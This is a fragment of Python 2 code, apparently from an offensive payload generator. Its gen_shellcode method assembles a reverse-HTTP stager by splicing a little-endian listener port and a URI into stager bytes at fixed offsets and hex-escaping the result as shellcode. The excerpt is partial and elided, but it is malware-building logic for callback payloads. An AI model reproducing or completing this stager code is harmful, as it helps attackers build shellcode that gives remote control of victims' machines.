...
class PayloadModule:
    ...
    def gen_shellcode(self):
        ...
        final_http_shellcode = self.stager[0:self.lport_offset]
        final_p1 = "\\x" + '\\x'.join(final_http_shellcode.encode('hex')[i:i+2] for i in range(0, len(final_http_shellcode.encode('hex')), 2))
        final_p1 += port_little_endian   # Add 91 bytes to get to URI offset
        final_http_shellcode = self.stager[self.lport_offset + 2:self.uri_offset]
        final_p2 = "\\x" + '\\x'.join(final_http_shellcode.encode('hex')[i:i+2] for i in range(0, len(final_http_shellcode.encode('hex')), 2))
        final_p2 += uri_shellcode + "\x00".encode('string-escape')
        final_http_shellcode = self.stager[self.uri_offset + 5:]
        final_p3 = "\\x" + '\\x'.join(final_http_shellcode.encode('hex')[i:i+2] for i in range(0, len(final_http_shellcode.encode('hex')), 2))
